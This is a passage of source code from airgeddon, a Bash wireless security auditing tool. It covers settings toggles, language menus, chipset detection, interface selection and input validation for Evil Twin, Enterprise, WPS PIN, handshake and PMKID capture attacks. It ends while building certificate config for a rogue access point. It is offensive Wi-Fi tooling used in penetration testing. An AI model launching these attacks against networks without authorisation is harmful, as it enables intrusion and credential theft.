						language_strings "${language}" 560 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 559 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_BASIC_COLORS"; then
						echo
						language_strings "${language}" 561 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		5)
			if ! hash ccze 2> /dev/null; then
				echo
				language_strings "${language}" 464 "yellow"
			fi

			if "${AIRGEDDON_EXTENDED_COLORS:-true}"; then
				ask_yesno 462 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_EXTENDED_COLORS"; then
						echo
						language_strings "${language}" 466 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 463 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_EXTENDED_COLORS"; then
						echo
						language_strings "${language}" 465 "blue"
						if ! "${AIRGEDDON_BASIC_COLORS:-true}"; then
							echo
							language_strings "${language}" 562 "yellow"
						fi
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		6)
			if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
				ask_yesno 469 "no"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_AUTO_CHANGE_LANGUAGE"; then
						echo
						language_strings "${language}" 473 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				echo
				language_strings "${language}" 471 "yellow"
				ask_yesno 470 "no"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_AUTO_CHANGE_LANGUAGE"; then
						echo
						language_strings "${language}" 472 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		7)
			if "${AIRGEDDON_SILENT_CHECKS:-true}"; then
				ask_yesno 577 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_SILENT_CHECKS"; then
						echo
						language_strings "${language}" 579 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 578 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_SILENT_CHECKS"; then
						echo
						language_strings "${language}" 580 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		8)
			if "${AIRGEDDON_PRINT_HINTS:-true}"; then
				ask_yesno 586 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_PRINT_HINTS"; then
						echo
						language_strings "${language}" 588 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 587 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_PRINT_HINTS"; then
						echo
						language_strings "${language}" 589 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		9)
			if "${AIRGEDDON_5GHZ_ENABLED:-true}"; then
				ask_yesno 596 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_5GHZ_ENABLED"; then
						echo
						language_strings "${language}" 598 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 597 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_5GHZ_ENABLED"; then
						echo
						language_strings "${language}" 599 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		10)
			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
				ask_yesno 657 "yes"
				if [ "${yesno}" = "y" ]; then
					sed -ri "s:(AIRGEDDON_WINDOWS_HANDLING)=(xterm):\1=tmux:" "${rc_path}" 2> /dev/null
					echo
					language_strings "${language}" 620 "yellow"
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 658 "yes"
				if [ "${yesno}" = "y" ]; then
					sed -ri "s:(AIRGEDDON_WINDOWS_HANDLING)=(tmux):\1=xterm:" "${rc_path}" 2> /dev/null
					echo
					language_strings "${language}" 620 "yellow"
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		11)
			ask_yesno 639 "yes"
			if [ "${yesno}" = "y" ]; then
				mdk_version_toggle

				echo
				language_strings "${language}" 640 "yellow"
				language_strings "${language}" 115 "read"
			fi
		;;
		12)
			if "${AIRGEDDON_PLUGINS_ENABLED:-true}"; then
				ask_yesno 655 "yes"
			else
				ask_yesno 656 "yes"
			fi

			if [ "${yesno}" = "y" ]; then
				if option_toggle "AIRGEDDON_PLUGINS_ENABLED" "required_reboot"; then
					echo
					language_strings "${language}" 620 "yellow"
				else
					echo
					language_strings "${language}" 417 "red"
				fi
				language_strings "${language}" 115 "read"
			fi
		;;
		13)
			if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
				ask_yesno 692 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING"; then
						echo
						language_strings "${language}" 694 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 693 "yes"
				if [ "${yesno}" = "y" ]; then
					if option_toggle "AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING"; then
						echo
						language_strings "${language}" 695 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		14)
			ask_yesno 478 "yes"
			if [ "${yesno}" = "y" ]; then
				get_current_permanent_language
				if [ "${language}" = "${current_permanent_language}" ]; then
					echo
					language_strings "${language}" 480 "red"
				else
					if "${AIRGEDDON_AUTO_CHANGE_LANGUAGE:-true}"; then
						echo
						language_strings "${language}" 479 "yellow"
						option_toggle "AIRGEDDON_AUTO_CHANGE_LANGUAGE"
					fi

					if set_permanent_language; then
						echo
						language_strings "${language}" 481 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
				fi
				language_strings "${language}" 115 "read"
			fi
		;;
		*)
			invalid_menu_option
		;;
	esac

	option_menu
}

#Language change menu
function language_menu() {

	debug_print

	clear
	language_strings "${language}" 87 "title"
	current_menu="language_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 81 "green"
	print_simple_separator
	language_strings "${language}" 446
	print_simple_separator
	language_strings "${language}" 79
	language_strings "${language}" 80
	language_strings "${language}" 113
	language_strings "${language}" 116
	language_strings "${language}" 249
	language_strings "${language}" 308
	language_strings "${language}" 320
	language_strings "${language}" 482
	language_strings "${language}" 58
	language_strings "${language}" 331
	language_strings "${language}" 519
	language_strings "${language}" 687
	print_hint ${current_menu}

	read -rp "> " language_selected
	echo
	case ${language_selected} in
		0)
			return
		;;
		1)
			if [ "${language}" = "ENGLISH" ]; then
				language_strings "${language}" 251 "red"
			else
				language="ENGLISH"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		2)
			if [ "${language}" = "SPANISH" ]; then
				language_strings "${language}" 251 "red"
			else
				language="SPANISH"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		3)
			if [ "${language}" = "FRENCH" ]; then
				language_strings "${language}" 251 "red"
			else
				language="FRENCH"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		4)
			if [ "${language}" = "CATALAN" ]; then
				language_strings "${language}" 251 "red"
			else
				language="CATALAN"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		5)
			if [ "${language}" = "PORTUGUESE" ]; then
				language_strings "${language}" 251 "red"
			else
				language="PORTUGUESE"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		6)
			if [ "${language}" = "RUSSIAN" ]; then
				language_strings "${language}" 251 "red"
			else
				language="RUSSIAN"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		7)
			if [ "${language}" = "GREEK" ]; then
				language_strings "${language}" 251 "red"
			else
				language="GREEK"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		8)
			if [ "${language}" = "ITALIAN" ]; then
				language_strings "${language}" 251 "red"
			else
				language="ITALIAN"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		9)
			if [ "${language}" = "POLISH" ]; then
				language_strings "${language}" 251 "red"
			else
				language="POLISH"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		10)
			if [ "${language}" = "GERMAN" ]; then
				language_strings "${language}" 251 "red"
			else
				language="GERMAN"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		11)
			if [ "${language}" = "TURKISH" ]; then
				language_strings "${language}" 251 "red"
			else
				language="TURKISH"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		12)
			if [ "${language}" = "ARABIC" ]; then
				language_strings "${language}" 251 "red"
			else
				language="ARABIC"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		*)
			invalid_language_selected
		;;
	esac

	detect_rtl_language
	initialize_language_strings

	language_menu
}

#Read the chipset for an interface
function set_chipset() {

	debug_print

	chipset=""
	sedrule1="s/^[0-9a-f]\{1,4\} \|^ //Ig"
	sedrule2="s/ Network Connection.*//Ig"
	sedrule3="s/ Wireless.*//Ig"
	sedrule4="s/ PCI Express.*//Ig"
	sedrule5="s/ \(Gigabit\|Fast\) Ethernet.*//Ig"
	sedrule6="s/ \[.*//"
	sedrule7="s/ (.*//"
	sedrule8="s|802\.11a/b/g/n/ac.*||Ig"

	sedruleall="${sedrule1};${sedrule2};${sedrule3};${sedrule4};${sedrule5};${sedrule6};${sedrule7};${sedrule8}"

	if [ -f "/sys/class/net/${1}/device/modalias" ]; then
		bus_type=$(cut -f 1 -d ":" < "/sys/class/net/${1}/device/modalias")

		if [ "${bus_type}" = "usb" ]; then
			vendor_and_device=$(cut -b 6-14 < "/sys/class/net/${1}/device/modalias" | sed 's/^.//;s/p/:/')
			if hash lsusb 2> /dev/null; then
				if [[ -n "${2}" ]] && [[ "${2}" = "read_only" ]]; then
					requested_chipset=$(lsusb | grep -i "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
				else
					chipset=$(lsusb | grep -i "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
				fi
			fi

		elif [[ "${bus_type}" =~ pci|ssb|bcma|pcmcia ]]; then
			if [[ -f /sys/class/net/${1}/device/vendor ]] && [[ -f /sys/class/net/${1}/device/device ]]; then
				vendor_and_device=$(cat "/sys/class/net/${1}/device/vendor"):$(cat "/sys/class/net/${1}/device/device")
				if [[ -n "${2}" ]] && [[ "${2}" = "read_only" ]]; then
					requested_chipset=$(lspci -d "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
				else
					chipset=$(lspci -d "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
				fi
			else
				if hash ethtool 2> /dev/null; then
					ethtool_output=$(ethtool -i "${1}" 2>&1)
					vendor_and_device=$(printf "%s" "${ethtool_output}" | grep "bus-info" | cut -f 3 -d ":" | sed 's/^ //')
					if [[ -n "${2}" ]] && [[ "${2}" = "read_only" ]]; then
						requested_chipset=$(lspci | grep "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
					else
						chipset=$(lspci | grep "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
					fi
				fi
			fi
		fi
	elif [[ -f /sys/class/net/${1}/device/idVendor ]] && [[ -f /sys/class/net/${1}/device/idProduct ]]; then
		vendor_and_device=$(cat "/sys/class/net/${1}/device/idVendor"):$(cat "/sys/class/net/${1}/device/idProduct")
		if hash lsusb 2> /dev/null; then
			if [[ -n "${2}" ]] && [[ "${2}" = "read_only" ]]; then
				requested_chipset=$(lsusb | grep -i "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
			else
				chipset=$(lsusb | grep -i "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
			fi
		fi
	fi
}

#Manage and validate the prerequisites for DoS Pursuit mode integrated on Evil Twin and Enterprise attacks
function dos_pursuit_mode_et_handler() {

	debug_print

	ask_yesno 505 "no"
	if [ "${yesno}" = "y" ]; then
		dos_pursuit_mode=1

		if [ "${et_dos_attack}" = "Wds Confusion" ]; then
			echo
			language_strings "${language}" 508 "yellow"
			language_strings "${language}" 115 "read"
		fi

		if select_secondary_et_interface "dos_pursuit_mode"; then

			if [[ "${dos_pursuit_mode}" -eq 1 ]] && [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]] && [[ "${interfaces_band_info['secondary_wifi_interface','5Ghz_allowed']}" -eq 0 ]]; then
				echo
				language_strings "${language}" 394 "red"
				language_strings "${language}" 115 "read"

				if [ -n "${enterprise_mode}" ]; then
					return_to_enterprise_main_menu=1
				else
					return_to_et_main_menu=1
				fi
				return 1
			fi

			if ! check_monitor_enabled "${secondary_wifi_interface}"; then
				echo
				language_strings "${language}" 14 "yellow"
				echo
				language_strings "${language}" 513 "blue"
				language_strings "${language}" 115 "read"
				echo
				if ! monitor_option "${secondary_wifi_interface}"; then
					if [ -n "${enterprise_mode}" ]; then
						return_to_enterprise_main_menu=1
					else
						return_to_et_main_menu=1
					fi
					return 1
				else
					echo
					language_strings "${language}" 34 "yellow"
					language_strings "${language}" 115 "read"
				fi
			else
				echo
				language_strings "${language}" 34 "yellow"
				language_strings "${language}" 115 "read"
			fi
		else
			return 1
		fi
	fi

	return 0
}

#Secondary interface selection menu for Evil Twin and Enterprise attacks
function select_secondary_et_interface() {

	debug_print

	if [ "${return_to_et_main_menu}" -eq 1 ]; then
		return 1
	fi

	if [ "${return_to_enterprise_main_menu}" -eq 1 ]; then
		return 1
	fi

	clear
	if [ -n "${enterprise_mode}" ]; then
		current_menu="enterprise_attacks_menu"
		case ${enterprise_mode} in
			"smooth")
				language_strings "${language}" 522 "title"
			;;
			"noisy")
				language_strings "${language}" 523 "title"
			;;
		esac
	else
		current_menu="evil_twin_attacks_menu"
		case ${et_mode} in
			"et_onlyap")
				language_strings "${language}" 270 "title"
			;;
			"et_sniffing")
				language_strings "${language}" 291 "title"
			;;
			"et_sniffing_sslstrip2")
				language_strings "${language}" 292 "title"
			;;
			"et_sniffing_sslstrip2_beef")
				language_strings "${language}" 397 "title"
			;;
			"et_captive_portal")
				language_strings "${language}" 293 "title"
			;;
		esac
	fi

	if [ "${1}" = "dos_pursuit_mode" ]; then
		readarray -t secondary_ifaces < <(iw dev | grep "Interface" | awk '{print $2}' | grep "${interface}" -v)
	elif [ "${1}" = "internet" ]; then
		if [ -n "${secondary_wifi_interface}" ]; then
			readarray -t secondary_ifaces < <(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep -E "^lo$" -v | grep "${interface}" -v | grep "${secondary_wifi_interface}" -v)
		else
			readarray -t secondary_ifaces < <(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep -E "^lo$" -v | grep "${interface}" -v)
		fi
	fi

	if [ ${#secondary_ifaces[@]} -eq 1 ]; then
		if [ "${1}" = "dos_pursuit_mode" ]; then
			secondary_wifi_interface="${secondary_ifaces[0]}"
			secondary_phy_interface=$(physical_interface_finder "${secondary_wifi_interface}")
			check_interface_supported_bands "${secondary_phy_interface}" "secondary_wifi_interface"
		elif [ "${1}" = "internet" ]; then
			internet_interface="${secondary_ifaces[0]}"
		fi

		echo
		language_strings "${language}" 662 "yellow"
		language_strings "${language}" 115 "read"
		return 0
	fi

	option_counter=0
	for item in "${secondary_ifaces[@]}"; do
		if [ ${option_counter} -eq 0 ]; then
			if [ "${1}" = "dos_pursuit_mode" ]; then
				echo
				language_strings "${language}" 511 "green"
			elif [ "${1}" = "internet" ]; then
				echo
				language_strings "${language}" 279 "green"
			fi
			print_simple_separator
			if [ -n "${enterprise_mode}" ]; then
				language_strings "${language}" 521
			else
				language_strings "${language}" 266
			fi
			print_simple_separator
		fi

		option_counter=$((option_counter + 1))
		if [ ${#option_counter} -eq 1 ]; then
			spaceiface="  "
		else
			spaceiface=" "
		fi
		set_chipset "${item}"
		echo -ne "${option_counter}.${spaceiface}${item} "
		if [ -z "${chipset}" ]; then
			language_strings "${language}" 245 "blue"
		else
			if [ "${is_rtl_language}" -eq 1 ]; then
				echo -e "${blue_color}// ${normal_color}${chipset} ${yellow_color}:Chipset${normal_color}"
			else
				echo -e "${blue_color}// ${yellow_color}Chipset:${normal_color} ${chipset}"
			fi
		fi
	done

	if [ ${option_counter} -eq 0 ]; then
		if [ -n "${enterprise_mode}" ]; then
			return_to_enterprise_main_menu=1
		else
			return_to_et_main_menu=1
			return_to_et_main_menu_from_beef=1
		fi

		echo
		if [ "${1}" = "dos_pursuit_mode" ]; then
			language_strings "${language}" 510 "red"
		elif [ "${1}" = "internet" ]; then
			language_strings "${language}" 280 "red"
		fi
		language_strings "${language}" 115 "read"
		return 1
	fi

	if [ ${option_counter: -1} -eq 9 ]; then
		spaceiface+=" "
	fi
	print_hint ${current_menu}

	read -rp "> " secondary_iface
	if [ "${secondary_iface}" -eq 0 ] 2> /dev/null; then
		if [ -n "${enterprise_mode}" ]; then
			return_to_enterprise_main_menu=1
		else
			return_to_et_main_menu=1
			return_to_et_main_menu_from_beef=1
		fi
		return 1
	elif [[ ! ${secondary_iface} =~ ^[[:digit:]]+$ ]] || (( secondary_iface < 1 || secondary_iface > option_counter )); then
		if [ "${1}" = "dos_pursuit_mode" ]; then
			invalid_secondary_iface_selected "dos_pursuit_mode"
		else
			invalid_secondary_iface_selected "internet"
		fi
	else
		option_counter2=0
		for item2 in "${secondary_ifaces[@]}"; do
			option_counter2=$((option_counter2 + 1))
			if [[ "${secondary_iface}" = "${option_counter2}" ]]; then
				if [ "${1}" = "dos_pursuit_mode" ]; then
					secondary_wifi_interface=${item2}
					secondary_phy_interface=$(physical_interface_finder "${secondary_wifi_interface}")
					check_interface_supported_bands "${secondary_phy_interface}" "secondary_wifi_interface"
				elif [ "${1}" = "internet" ]; then
					internet_interface=${item2}
				fi
				break
			fi
		done
		return 0
	fi
}

#Interface selection menu
function select_interface() {

	debug_print

	local interface_menu_band

	clear
	language_strings "${language}" 88 "title"
	current_menu="select_interface_menu"
	language_strings "${language}" 24 "green"
	print_simple_separator
	ifaces=$(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep -E "^lo$" -v)
	option_counter=0
	for item in ${ifaces}; do
		option_counter=$((option_counter + 1))
		if [ ${#option_counter} -eq 1 ]; then
			spaceiface="  "
		else
			spaceiface=" "
		fi
		echo -ne "${option_counter}.${spaceiface}${item} "
		set_chipset "${item}"
		if [ "${chipset}" = "" ]; then
			language_strings "${language}" 245 "blue"
		else
			interface_menu_band=""
			if check_interface_wifi "${item}"; then
				interface_menu_band+="${blue_color}// ${pink_color}"
				get_5ghz_band_info_from_phy_interface "$(physical_interface_finder "${item}")"
				case "$?" in
					"1")
						interface_menu_band+="${band_24ghz}"
					;;
					*)
						interface_menu_band+="${band_24ghz}, ${band_5ghz}"
					;;
				esac
			fi

			if [ "${is_rtl_language}" -eq 1 ]; then
				echo -e "${interface_menu_band} ${blue_color}// ${normal_color}${chipset} ${yellow_color}:Chipset${normal_color}"
			else
				echo -e "${interface_menu_band} ${blue_color}// ${yellow_color}Chipset:${normal_color} ${chipset}"
			fi
		fi
	done
	print_hint ${current_menu}

	read -rp "> " iface
	if [[ ! ${iface} =~ ^[[:digit:]]+$ ]] || (( iface < 1 || iface > option_counter )); then
		invalid_iface_selected
	else
		interface=$(convert_iface_to_ifname "${iface}")
		phy_interface=$(physical_interface_finder "${interface}")
		check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
		interface_mac=$(ip link show "${interface}" | awk '/ether/ {print $2}')
		if ! check_vif_support; then
			card_vif_support=0
		else
			card_vif_support=1
		fi
	fi
}
function convert_iface_to_ifname() {

	debug_print

	local ifaceNumber; ifaceNumber="${1}"
	local option_counter; option_counter=0

	for ifaceName in ${ifaces}; do
		option_counter=$((option_counter + 1))
		if [[ "${ifaceNumber}" = "${option_counter}" ]]; then
			echo "${ifaceName}"
			break
		fi
	done
}

#Read the user input on yes/no questions
function read_yesno() {

	debug_print

	echo
	language_strings "${language}" "${1}" "green"
	read -rp "> " yesno
}

#Validate the input on yes/no questions
function ask_yesno() {

	debug_print

	if [ -z "${2}" ]; then
		local regexp="^[YN]$|^YES$|^NO$"
		visual_choice="[y/n]"
	else
		local regexp="^[YN]$|^YES$|^NO$|^$"
		default_choice="${2}"
		if [[ ${default_choice^^} =~ ^[Y]$|^YES$ ]]; then
			default_choice="y"
			visual_choice="[Y/n]"
		else
			default_choice="n"
			visual_choice="[y/N]"
		fi
	fi

	yesno="null"
	while [[ ! ${yesno^^} =~ ${regexp} ]]; do
		read_yesno "${1}"
	done

	case ${yesno^^} in
		"Y"|"YES")
			yesno="y"
		;;
		"N"|"NO")
			yesno="n"
		;;
		"")
			yesno="${default_choice}"
		;;
	esac
}

#Read the user input on channel questions
function read_channel() {

	debug_print

	echo
	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
		language_strings "${language}" 25 "green"
	else
		language_strings "${language}" 517 "green"
	fi

	if [ "${1}" = "wps" ]; then
		read -rp "> " wps_channel
	else
		read -rp "> " channel
	fi
}

#Validate the input on channel questions
function ask_channel() {

	debug_print

	local regexp
	if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
		regexp="^${valid_channels_24_ghz_regexp}$"
	else
		regexp="^${valid_channels_24_and_5_ghz_regexp}$"
	fi

	if [ "${1}" = "wps" ]; then
		if [[ -n "${wps_channel}" ]] && [[ "${wps_channel}" -gt 14 ]]; then
			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				echo
				language_strings "${language}" 515 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		fi

		while [[ ! ${wps_channel} =~ ${regexp} ]]; do
			read_channel "wps"
		done
		echo
		language_strings "${language}" 365 "blue"
	else
		if [[ -n "${channel}" ]] && [[ "${channel}" -gt 14 ]]; then
			if [ "${interfaces_band_info['main_wifi_interface','5Ghz_allowed']}" -eq 0 ]; then
				echo
				language_strings "${language}" 515 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		fi

		while [[ ! ${channel} =~ ${regexp} ]]; do
			read_channel
		done
		echo
		language_strings "${language}" 26 "blue"
	fi

	return 0
}

#Read the user input on asleap challenge
function read_challenge() {

	debug_print

	echo
	language_strings "${language}" 553 "green"
	read -rp "> " enterprise_asleap_challenge
}

#Read the user input on asleap response
function read_response() {

	debug_print

	echo
	language_strings "${language}" 554 "green"
	read -rp "> " enterprise_asleap_response
}

#Read the user input on bssid questions
function read_bssid() {

	debug_print

	echo
	language_strings "${language}" 27 "green"
	if [ "${1}" = "wps" ]; then
		read -rp "> " wps_bssid
	else
		read -rp "> " bssid
	fi
}

#Validate the input on bssid questions
function ask_bssid() {

	debug_print

	local regexp="^([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}$"

	if [ "${1}" = "wps" ]; then
		if [ -z "${wps_bssid}" ]; then
			ask_yesno 439 "no"
			if [ "${yesno}" = "n" ]; then
				return 1
			fi
		fi

		while [[ ! ${wps_bssid} =~ ${regexp} ]]; do
			read_bssid "wps"
		done
		echo
		language_strings "${language}" 364 "blue"
	else
		if [ -z "${bssid}" ]; then
			ask_yesno 439 "no"
			if [ "${yesno}" = "n" ]; then
				return 1
			fi
		fi

		while [[ ! ${bssid} =~ ${regexp} ]]; do
			read_bssid
		done
		echo
		language_strings "${language}" 28 "blue"
	fi
	return 0
}

#Read the user input on essid questions
function read_essid() {

	debug_print

	echo
	language_strings "${language}" 29 "green"
	read -rp "> " essid
}

#Validate the input on essid questions
function ask_essid() {

	debug_print

	if [ -z "${essid}" ]; then

		if [ "${1}" = "verify" ]; then
			ask_yesno 439 "no"
			if [ "${yesno}" = "n" ]; then
				return 1
			fi
		fi

		while [[ -z "${essid}" ]]; do
			read_essid
		done
	elif [ "${essid}" = "(Hidden Network)" ]; then
		echo
		language_strings "${language}" 30 "yellow"
		read_essid
	fi

	echo
	language_strings "${language}" 31 "blue"
}

#Read the user input on custom pin questions
function read_custom_pin() {

	debug_print

	echo
	language_strings "${language}" 363 "green"
	read -rp "> " custom_pin
}

#Validate the input on custom pin questions
function ask_custom_pin() {

	debug_print

	local regexp="^[0-9]{8}$"
	custom_pin=""
	while [[ ! ${custom_pin} =~ ${regexp} ]]; do
		read_custom_pin
	done

	echo
	language_strings "${language}" 362 "blue"
}

#Read the user input on timeout questions
function read_timeout() {

	debug_print

	echo
	case ${1} in
		"wps_standard")
			min_max_timeout="10-100"
			timeout_shown="${timeout_secs_per_pin}"
		;;
		"wps_pixiedust")
			min_max_timeout="25-2400"
			timeout_shown="${timeout_secs_per_pixiedust}"
		;;
		"capture_handshake")
			min_max_timeout="10-100"
			timeout_shown="${timeout_capture_handshake}"
		;;
		"capture_pmkid")
			min_max_timeout="10-100"
			timeout_shown="${timeout_capture_pmkid}"
		;;
	esac

	language_strings "${language}" 393 "green"
	read -rp "> " timeout
}

#Validate the user input for timeouts
function ask_timeout() {

	debug_print

	case ${1} in
		"wps_standard")
			local regexp="^[1-9][0-9]$|^100$|^$"
		;;
		"wps_pixiedust")
			local regexp="^2[5-9]$|^[3-9][0-9]$|^[1-9][0-9]{2}$|^1[0-9]{3}$|^2[0-3][0-9]{2}$|^2400$|^$"
		;;
		"capture_handshake")
			local regexp="^[1-9][0-9]$|^100$|^$"
		;;
		"capture_pmkid")
			local regexp="^[1-9][0-9]$|^100$|^$"
		;;
	esac

	timeout=0
	while [[ ! ${timeout} =~ ${regexp} ]]; do
		read_timeout "${1}"
	done

	if [ "${timeout}" = "" ]; then
		case ${1} in
			"wps_standard")
				timeout=${timeout_secs_per_pin}
			;;
			"wps_pixiedust")
				timeout=${timeout_secs_per_pixiedust}
			;;
			"capture_handshake")
				timeout=${timeout_capture_handshake}
			;;
			"capture_pmkid")
				timeout=${timeout_capture_pmkid}
			;;
		esac
	fi

	echo
	case ${1} in
		"wps_standard")
			timeout_secs_per_pin=${timeout}
		;;
		"wps_pixiedust")
			timeout_secs_per_pixiedust=${timeout}
		;;
		"capture_handshake")
			timeout_capture_handshake=${timeout}
		;;
		"capture_pmkid")
				timeout_capture_pmkid=${timeout}
			;;
	esac

	language_strings "${language}" 391 "blue"
}

#Handle the proccess of checking handshake capture
function handshake_capture_check() {

	debug_print

	local time_counter=0
	while true; do
		sleep 5
		if check_bssid_in_captured_file "${tmpdir}${standardhandshake_filename}" "silent" "only_handshake"; then
			break
		fi

		time_counter=$((time_counter + 5))
		if [ ${time_counter} -ge ${timeout_capture_handshake} ]; then
			break
		fi
	done

	kill "${processidcapture}" &> /dev/null
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
		tmux kill-window -t "${session_name}:Capturing Handshake"
	fi
}

#Generate the needed config files for certificates creation
#shellcheck disable=SC2016
function create_certificates_config_files() {

	debug_print

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${certsdir}" > /dev/null 2>&1
	mkdir "${tmpdir}${certsdir}" > /dev/null 2>&1

	{
	echo -e "[ ca ]"
	echo -e "default_ca = CA_default\n"
	echo -e "[ CA_default ]"
	echo -e "dir = ${tmpdir}${certsdir::-1}"
	echo -e 'certs = $dir'
	echo -e 'crl_dir = $dir/crl'
	echo -e 'database = $dir/index.txt'
	echo -e 'new_certs_dir = $dir'
	echo -e 'certificate = $dir/server.pem'
	echo -e 'serial = $dir/serial'
	echo -e 'crl = $dir/crl.pem'
	echo -e 'private_key = $dir/server.key'
	echo -e 'RANDFILE = $dir/.rand'
	echo -e "name_opt = ca_default"
	echo -e "cert_opt = ca_default"
	echo -e "default_days = 3650"
	echo -e "default_crl_days = 30"
	echo -e "default_md = md5"
	echo -e "preserve = no"
	echo -e "policy = policy_match\n"
	echo -e "[ policy_match ]"
	echo -e "countryName = match"
	echo -e "stateOrProvinceName = match"
	echo -e "organizationName = match"
	echo -e "organizationalUnitName = optional"
	echo -e "commonName = supplied"
	echo -e "emailAddress = optional\n"
	echo -e "[ policy_anything ]"
	echo -e "countryName = optional"
	echo -e "stateOrProvinceName = optional"
	echo -e "localityName = optional"
	echo -e "organizationName = optional"
	echo -e "organizationalUnitName = optional"
	echo -e "commonName = supplied"
	echo -e "emailAddress = optional\n"
	echo -e "[ req ]"
	echo -e "prompt = no"
	echo -e "distinguished_name = server"
	echo -e "default_bits = 2048"
	echo -e "input_password = ${certspass}"
	echo -e "output_password = ${certspass}\n"
	echo -e "[server]"
	echo -e "countryName = ${custom_certificates_country}"
	echo -e "stateOrProvinceName = ${custom_certificates_state}"
	echo -e "localityName = ${custom_certificates_locale}"
	echo -e "organizationName = ${custom_certificates_organization}"
	echo -e "emailAddress = ${custom_certificates_email}"
